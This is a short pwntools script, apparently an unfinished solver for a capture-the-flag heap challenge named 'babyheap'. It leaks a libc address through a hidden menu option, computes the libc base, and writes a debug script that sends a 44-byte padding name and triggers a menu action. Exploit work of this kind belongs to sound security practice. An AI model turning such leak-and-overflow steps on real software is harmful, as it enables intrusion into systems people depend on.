from pwn import *
context.log_level = 'error'

def check_regs():
    p = process('./dist-babyheap/babyheap')
    p.recvuntil(b'3. Make greycat talk\n')
    p.sendline(b'6767')
    libc_leak = int(p.recvline().strip(), 16)
    libc_base = libc_leak - 0xad670 # local offset
    libc = ELF('/lib/x86_64-linux-gnu/libc.so.6', checksec=False)
    libc.address = libc_base

    with open('solve_gdb.py', 'w') as f:
        f.write(f'''
from pwn import *
p = process('./dist-babyheap/babyheap')
p.recvuntil(b'3. Make greycat talk\\n')
p.sendline(b'2')
p.recvuntil(b'name:\\n')
p.sendline(b'A'*44)
p.recvuntil(b'talk\\n')
with open('pid.txt', 'w') as f2:
    f2.write(str(p.pid))
pause()
p.sendline(b'3')
p.recvuntil(b'index: \\n')
p.sendline(b'0')
p.interactive()
''')

check_regs()
